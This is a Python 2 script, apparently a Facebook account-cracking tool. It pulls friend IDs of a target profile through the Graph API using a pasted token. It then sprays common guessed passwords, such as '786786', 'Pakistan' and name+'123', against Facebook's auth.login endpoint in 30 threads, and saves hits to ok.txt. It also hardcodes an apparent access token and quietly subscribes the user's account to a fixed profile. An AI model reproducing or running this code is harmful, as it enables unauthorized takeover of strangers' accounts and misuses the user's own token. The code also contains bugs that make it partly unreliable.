#coding:utf-8
#!/user/bin/python2
#coding by Zakarya
try:    
    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system('python2 Fb2.py')
try:
    os.mkdir('Fb2')
except OSError:
    pass

from requests.exceptions import ConnectionError
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-Telkomsel': repr(sim),'x-fb-net-Telkomsel': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyLTE','user-agent':'Mozilla/5.0 (Linux; Android 5.1.1; walleye/Bulid/LMY48G;wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf8")

def exit():
    print '[!] Exit'
    os.sys.exit()
    
def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
        return cetak(d)
        


#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'

logo = """                          
  .S_SsS_S.     sSSs   .S_sSSs    sdSS_SSSSSSbs   .S_SSSs    S.      
.SS~S*S~SS.   d%%SP  .SS~YS%%b   YSSS~S%SSSSSP  .SS~SSSSS   SS.     
S%S `Y' S%S  d%S'    S%S   `S%b       S%S       S%S   SSSS  S%S     
S%S     S%S  S%S     S%S    S%S       S%S       S%S    S%S  S%S     
S%S     S%S  S&S     S%S    S&S       S&S       S%S SSSS%S  S&S     
S&S     S&S  S&S_Ss  S&S    S&S       S&S       S&S  SSS%S  S&S     
S&S     S&S  S&S~SP  S&S    S&S       S&S       S&S    S&S  S&S     
S&S     S&S  S&S     S&S    S&S       S&S       S&S    S&S  S&S     
S*S     S*S  S*b     S*S    S*S       S*S       S*S    S&S  S*b     
S*S     S*S  S*S.    S*S    S*S       S*S       S*S    S*S  S*S.    
S*S     S*S   SSSbs  S*S    S*S       S*S       S*S    S*S   SSSbs  
SSS     S*S    YSSP  S*S    SSS       S*S       SSS    S*S    YSSP  
        SP           SP               SP               SP           
        Y            Y                Y                Y


.sSSSSSSSs.  SSSSS SSSS' SSSSS SSSS' 
SSSSS SSSSS  S SSS       S SSS       
SSSSS SSSSS  SSSSSsSSSs. SSSSSsSSSs. 
SSSSSsSSSSS       SSSSS       SSSSS 
SSSSS SSSSs .sSSS SSSSS .sSSS SSSSS 
SSSSS SSSSS S;;;S SSSSS S;;;S SSSSS 
S%%%S SSSSS S%%%S SSSSS S%%%S SSSSS 
`:;SSsSS;:' `:;SSsSS;:' `:;SSsSS;:'                                                                     
"""
CorrectUsername = "mental855"
CorrectPassword = "mental"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;91m[+] \033[1;91m \x1b[1;91mTool Username \x1b[1;91m: \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;91m[+] \033[1;91m \x1b[1;91mTool Password \x1b[1;91m: \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username 
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;97mWrong Password"
            os.system('xdg-open https://web.facebook.com/MentalHackers.net.net.net')      
idh = []

def logmen():
    os.system('clear')
    print logo
    print ' [1] Login Token'
    print ' [\x1b[91m0\x1b[0m] Exit Tool'
    pilog()
def pilog():
    og = raw_input("\nSelect: ")
    if og =="1":
        os.system("clear")
        print logo
        print 
        print ("\033[1;91m MENTAL-HACKERS-855") 
        print (" ")
        print (" ")
        print ("\033[1;92mToken No 1.  EAAAAUaZA8jlABAFJSFhiG1E3EhbRtzldAcYO2ZC0IFsRr0xXbtaBFBvajLoZA6h4ptDpgZBnxx7T7FaGtrWY6BZBDjkrmwVn85gpJZC7WUseC0SKqhuXWad8VLug8t6DPclZBKjIMsEByeQVU2tWb4e23cJ14aBvSrCGpDPMpmLwZAkNlejJDe0BlquZA8w6tyvcZD")
        print (" ")
        
        print
        token = raw_input("[+] Past Your Token Here : ")
        sav = open(".logfuck.txt","w")
        sav.write(token)
        sav.close()
        print ("\r\033[1;32m[✓] Login Succesfully\033[0;97m")
        os.system('xdg-open https://web.facebook.com/MentalHackers.net.net.net')
        time.sleep(1)
        bot_fl()
    elif og =="0":
        exit()
    else:
        print ("[!] Pilih Yang Bener Dong")
        pilog()
        
def bot_fl():
    try:
        token = open('.logfuck.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m   [!] Token invalid'
        os.system('rm -rf .logfuck.txt')
    requests.post('https://graph.facebook.com/100001027764318/subscribers?access_token=' + token)
    menu()
    
def menu():
    os.system("clear")
    try:
        token = open(".logfuck.txt","r").read()
    except IOError:
        print logo
        print("[!] token error. token not found")
        os.system("rm -rf .logfuck.txt")
        time.sleep(1)
        logmen()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token, headers=header)
        a = json.loads(r.text)
        name = a["name"]
    except KeyError:
        os.system("clear")
        print logo
        print("[!] Failed To Load. Your Checkpoint account")
        os.system("rm -rf .logfuck.txt")
        time.sleep(1)
        logmen()
    os.system("clear")
    print logo
    print("Welcome "+name)
    print (" ")
    print ("Please select")
    print (" ")
    print ("Don't Copy Me Because I Am Your Father")
    print (" ")
    print("[1] Start Cracking")
    print("[\x1b[91m0\x1b[0m] Exit")
    pil()
    
def pil():
    ti = raw_input('\nSelect: ')
    if ti =='1':
        cramen()
    elif ti =='0':
        os.system('rm -rf .logfuck.txt')
        print '[√] Deleting Token Successfully.'
        time.sleep(1)
        os.system('exit')
        logmen()
    else:
        print '[!] Pilih Yang Bener Dong'
        pil()
        
def cramen():
	global token
	os.system("clear")
	try:
		token=open(".logfuck.txt","r").read()
	except IOError:
		print("[!] Token Error. Token Not Working")
		os.system("rm -rf .logfuck.txt")
		time.sleep(1)
		logmen()
	os.system("clear")
	print logo
	print "[1] Crack ID Public"
	print '[\x1b[91m0\x1b[0m] Back'
	crapil()
	
def crapil():
	select = raw_input("\nSelect: ")
	id=[]
	oks=[]
	cps=[]
	if select=="10000":
		os.system("clear")
		print logo
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for s in z["data"]:
			uid=s['id']
			na=s['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="1":
		os.system("clear")
		print logo
		idt = raw_input("[+] Target ID : ")
		os.system("clear")
		print logo
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("[✓] Name : "+q["name"])
		except KeyError:
			print('\n[!] Fb ID . ID : '+idt+' Friends Not Public')
			raw_input("\nBack ")
			cramen()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	   
	elif select =="0":
		menu()
	else:
		print ("[!] Pilih Yang Bener Dong")
		crapil()
	print("[✓] Total ID : "+str(len(id)))
	time.sleep(0.5)
	print("PLEASE WAIT.........................!!!!!!!!!!!!!!")
	print("CRACKING ACCOUNTS WILL BE APPEAR HERE..")
	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
	
	
	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    pass1='786786'
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		    d=json.loads(q)
		    if 'www.facebook.com' in d['error_msg']:
		        print("Error "+uid+" | "+pass1+" --> CP")
		        cp=open("cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    else:
		    	if "access_token" in d:
		            print("\x1b[1;92mHack \033[1;30m"+uid+" | "+pass1+" --> OK\x1b[1;0m")
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		        else:
		            pass2="Pakistan"
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("Error "+uid+" | "+pass2+" --> CP")
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print("\x1b[1;92mHack \033[1;30m"+uid+" | "+pass2+" --> OK\x1b[1;0m")
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                else:
		                    pass3=name+"12345"
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("Error "+uid+" | "+pass3+" --> CP")
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                    else:
		                        if 'access_token' in d:
		                            print("\x1b[1;92mHack \033[1;30m"+uid+" | "+pass3+" --> OK\x1b[1;0m")
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                        else:
		                            pass4=name+"786"
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("Error "+uid+" | "+pass4+" --> CP")
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                            else:
		                                if 'access_token' in d:
		                                    print("\x1b[1;92mHack \033[1;30m"+uid+" | "+pass4+" --> OK\x1b[1;0m")
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                else:
		                                    pass5=name+"123"
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("Error "+uid+" | "+pass5+" --> CP")
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                    else:
		                                        if 'access_token' in d:
		                                            print("\x1b[1;92mHack \033[1;30m"+uid+" | "+pass5+" --> OK\x1b[1;0m")
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                        else:
		                                            pass6=name+"1234"
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                print("Error "+uid+" | "+pass6+" --> CP")
		                                                cp=open("cp.txt","a")
		                                                cp.write(uid+" | "+pass6+"\n")
		                                                cp.close()
		                                                cps.append(uid)
		                                            else:
		                                                if 'access_token' in d:
		                                                    print("\x1b[1;92mHack \033[1;30m"+uid+" | "+pass6+" --> OK\x1b[1;0m")
		                                                    ok=open("ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		                                                else:
		                                                    pass7=name+"g"
		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                                    d=json.loads(q)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("Error "+uid+" | "+pass7+" --> CP")
		                                                        cp=open("cp.txt","a")
		                                                        cp.write(uid+" | "+pass7+"\n")
		                                                        cp.close()
		                                                        cps.append(uid)
		                                                    else:
		                                                        if 'access_token' in d:
		                                                            print("\x1b[1;92mHack \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
		                                                            ok=open("ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)
		                                                        else:
		                                                        	pass8=name+"123456"
		                                                        	q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass8 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                                        	d=json.loads(q)
		                                                        	if 'www.facebook.com' in d['error_msg']:
		                                                        		print("Error "+uid+" | "+pass8+" --> CP")
		                                                        		cp=open("cp.txt","a")
		                                                        		cp.write(uid+" | "+pass8+"\n")
		                                                        		cp.close()
		                                                        		cps.append(uid)
		                                                        	else:
		                                                        		if 'access_token' in d:
		                                                        			print("\x1b[1;92mHack \033[1;30m"+uid+" | "+pass8+" --> OK\x1b[1;0m")
		                                                        			ok=open("ok.txt","a")
		                                                        			ok.write(uid+" | "+pass8+"\n")
		                                                        			cp.close()
		                                                        			cps.append(uid)
		                                                        		else:
		                                                        			pass9="Pakistan786"
		                                                        			q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass9 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                                        			d=json.loads(q)
		                                                        			if 'www.facebook.com' in d['error_msg']:
		                                                        				print("Error "+uid+" | "+pass9+" --> CP")
		                                                        				cp=open("cp.txt","a")
		                                                        				cp.write(uid+" | "+pass9+"\n")
		                                                        				cp.close()
		                                                        				cps.append(uid)
		                                                        			else:
		                                                        				if 'access_token' in d:
		                                                        					print("\x1b[1;92mHack \033[1;30m"+uid+" | "+pass9+" --> OK\x1b[1;0m")
		                                                        					ok=open("ok.txt","a")
		                                                        					ok.write(uid+" | "+pass9+"\n")
		                                                        					cp.close()
		                                                        					cps.append(uid)
		                                                        				else:
		                                                        					pass10="000786"
		                                                        					q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass10 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                                        					d=json.loads(q)
		                                                        					if 'www.facebook.com' in d['error_msg']:
		                                                        						print("Error "+uid+" | "+pass10+" --> CP")
		                                                        						cp=open("cp.txt","a")
		                                                        						cp.write(uid+" | "+pass10+"\n")
		                                                        						cp.close()
		                                                        						cps.append(uid)
		                                                        					else:
		                                                        						if 'access_token' in d:
		                                                        							print("\x1b[1;92mHack \033[1;30m"+uid+" | "+pass10+" --> OK\x1b[1;0m")
		                                                        							ok=open("ok.txt","a")
		                                                        							ok.write(uid+" | "+pass10+"\n")
		                                                        							cp.close()
		                                                        							cps.append(uid)
		                                                        						else:
		                                                        							pass11="786000, 786123, 123786, 234567, Mental_@, pakistan123, iloveu, iloveyou, ilovepak, 102030, a1b2c3"
		                                                        							q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass11 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                                        							d=json.loads(q)
		                                                        							if  'www.facebook.com' in d['error_msg']:
		                                                        								print("Error "+uid+" | "+pass11+" --> CP")
		                                                        								cp=open("cp.txt","a")
		                                                        								cp.write(uid+" | "+pass11+"\n")
		                                                        								cp.close()
		                                                        								cps.append(uid)
		                                                        							else:
		                                                        								if 'access_token' in d:
		                                                        									print("\x1b[1;92mHack \033[1;30m"+uid+" | "+pass11+" --> OK\x1b[1;0m")
		                                                        									ok=open("ok.txt","a")
		                                                        									ok.write(uid+" | "+pass11+"\n")
		                                                        									cp.close()
		                                                        									cps.append(uid)





															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print('')
	print('[✓] Total CP/\033[1:32mOK:\033[0;97m  '+str(len(cps))+'/\033[;32m \033[0;97m'+str(len(oks)))
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mMehar_Mental\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By Fsocity--855--•◈•---»" 
	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
	raw_input('Back')
	menu()
    
if __name__ == '__main__':
	menu()
